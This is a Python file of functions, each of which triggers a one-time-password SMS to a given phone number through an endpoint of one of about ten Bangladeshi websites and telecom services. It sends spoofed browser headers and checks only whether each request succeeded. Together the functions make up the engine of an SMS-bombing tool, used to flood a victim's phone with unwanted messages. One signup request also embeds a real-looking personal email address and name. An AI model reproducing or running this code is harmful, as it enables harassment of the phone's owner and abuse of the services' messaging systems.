import requests

def send_bioscope_otp(number):
    headers = {
        "authority": "www.bioscopelive.com",
        "method": "GET",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "if-none-match": 'W/"5baf0d010507bc980255f9941283860a"',
        "referer": "https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    }
    url = f"https://www.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp"
    response = requests.get(url, headers=headers)
    return response.status_code

def send_bikroy_otp(number):
    headers = {
        "referer": "https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
    }
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
    response = requests.get(url, headers=headers)
    return response.status_code
#def paperfly_otp():
	#headers = {
#	}
	#url=f"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
	#respone = response.post(url,headers)    

def send_redx_otp(number):
    headers = {
        "referer": "https://redx.com.bd/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
    }
    data = {
        "name": number,
        "phoneNumber": number,
        "service": "redx"
    }
    url = "https://api.redx.com.bd/v1/user/signup"
    response = requests.post(url, headers=headers, data=data)
    #print(response)
    return response.status_code

def send_ecourier_otp(number):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'https://ecourier.com.bd',
        'Referer': 'https://ecourier.com.bd/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0{number}"
    response = requests.get(url, headers=headers)
    return response.status_code

def send_fundesh_otp(number):
    headers = {
        'authority': 'fundesh.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fundesh.com.bd',
        'referer': 'https://fundesh.com.bd/fundesh/profile',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'msisdn': number,
    }
    url = 'https://fundesh.com.bd/api/auth/generateOTP'
    response = requests.post(url, headers=headers, json=json_data)
    return response.status_code

def send_osudpotro_otp(number):
    headers = {
        'referer': 'https://osudpotro.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    data = {
        'mobile': f'+88-0{number}',
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    }
    url = 'https://api.osudpotro.com/api/v1/users/send_otp'
    response = requests.post(url, headers=headers, data=data)
    return response.status_code

def send_rokomari_otp(number):
    url = f"https://www.rokomari.com/resend-verification-code?email_phone=880{number}"
    response = requests.get(url)
    return response.status_code
    
def gp_otp(number):
	url=f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}"
	response = requests.get(url)
	return response.status_code
	
def bing_otp(number):
    url = f"https://ss.binge.buzz/otp/send/phone={number}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
                  "image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://ss.binge.buzz/",
        "Connection": "keep-alive"
    }

    response = requests.get(url, headers=headers)
    return response.status_code, response.text	   
    
def check_otp(number):
    data = {
        "company_name": "Hello",
        "email_address": "uladhosen860@gmail.com",
        "phone_number": number,
        "full_name": "limon hossain"
    }

    headers = { 
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
    response = requests.post(url, headers=headers, data=data)

    return response.text


